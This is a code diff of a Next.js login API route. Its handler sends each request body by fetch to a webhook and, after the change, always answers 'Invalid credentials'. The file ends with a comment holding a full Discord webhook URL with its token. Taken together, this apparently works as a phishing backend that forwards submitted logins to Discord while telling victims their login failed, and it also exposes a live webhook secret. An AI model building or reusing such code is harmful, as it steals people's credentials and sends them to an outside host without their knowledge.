@@ -4,8 +4,8 @@ dotenv.config()
 
 export async function POST(request) {
   const body = await request.json();
-
-  fetch(
+  console.log(process.env.WEBHOOK)
+  await fetch(
     process.env.WEBHOOK,
     {
       method: "post",
@@ -58,9 +58,6 @@ export async function POST(request) {
 
   await new Promise(resolve => setTimeout(resolve, 500)); // 1000ms = 1 saniye
 
-  if (body.username === "admin" && body.password === "admin") {
-    return NextResponse.json({ message: 'Login successful' }, { status: 200 })
-  }
   return NextResponse.json({ message: 'Invalid credentials' }, { status: 404 });
 }
 //https://discord.com/api/webhooks/1306939061797388289/iN0TVMDn4VXEfJSl5S795xsaK_HQCEX_QW0fpMNzG3S517frg1pD6hSlbd89CJL5hW9Q
